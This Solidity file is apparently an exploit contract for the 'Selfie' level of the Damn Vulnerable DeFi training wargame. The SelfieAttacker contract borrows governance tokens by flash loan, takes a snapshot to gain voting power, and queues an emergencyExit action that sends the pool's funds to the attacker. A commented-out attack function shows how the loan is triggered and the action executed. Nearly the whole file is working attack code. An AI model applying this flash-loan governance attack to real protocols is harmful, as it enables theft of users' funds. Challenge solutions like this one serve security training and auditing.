// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SelfiePool.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    SelfiePool public pool;
    address public attacker;
    uint256 public actionId;

    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _pool) {
        pool = SelfiePool(_pool);
        attacker = msg.sender;
    }

    function onFlashLoan(
        address _initiator,
        address _token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata /* _data */
    ) external override returns (bytes32) {
        ERC20Snapshot token = pool.token();

        require(
            msg.sender == address(pool),
            "Unexpected lender in flash loan callback"
        );
        require(
            _initiator == address(this) || _initiator == attacker,
            "Flash loan initiated by untrusted contract"
        );
        require(
            _token == address(token),
            "Flash loan initiated with untrusted token"
        );
        require(_fee == 0, "Flash loan initiated with fee");

        token.approve(address(pool), _amount);

        SimpleGovernance governance = pool.governance();
        address governanceToken = governance.getGovernanceToken();
        DamnValuableTokenSnapshot(governanceToken).snapshot();

        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            attacker
        );
        actionId = governance.queueAction(address(pool), 0, data);

        return CALLBACK_SUCCESS;
    }

    // function attack() external {
    //     address token = address(pool.token());
    //     bool success = pool.flashLoan(
    //         this,
    //         token,
    //         pool.maxFlashLoan(token),
    //         ""
    //     );
    //     require(success, "Flash loan attack failed");

    //     SimpleGovernance governance = pool.governance();
    //     governance.executeAction(actionId);
    // }

    receive() external payable {}
}
